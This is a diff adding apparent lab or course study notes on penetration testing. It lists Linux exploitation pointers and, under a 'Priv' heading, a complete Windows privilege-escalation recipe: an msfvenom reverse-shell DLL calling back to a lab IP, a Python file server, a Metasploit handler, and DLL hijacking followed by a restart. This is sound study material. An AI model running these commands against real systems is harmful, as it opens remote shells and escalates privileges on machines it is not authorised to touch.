@@ -726,19 +726,26 @@ xfreerdp /u:comrade /v:127.0.0.1:7890 -dynamic-resolution +glyph-cache +clipboar
 
 
 
+Exploit Development for linux, exploit research with google, worry about GTFO bins, and known important files on a linux system (/etc/shadow /etc/hosts /etc/passwd)
+Check in users home directories that we have access to
+For recon use your eyeballs and look at the pages
+SQL injection is extremely important
+Understand ssh keygen, code injection, and know the difference between code injection and directory traversal
 
 
 
+Priv - Code 8
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.23.212 LPORT=7777 -f dll > hijackmeplz.dll
+python -m SimpleHTTPServer 8000
 
+use multi/handler
+set LPORT 7777
+set payload windows/shell/reverse_tcp
+set LHOST 0.0.0.0
+run
 
-
-
-
-
-
-
-
-
+send hijackmeplz.dll to the memorystatus 
+restart windows
 
 
 
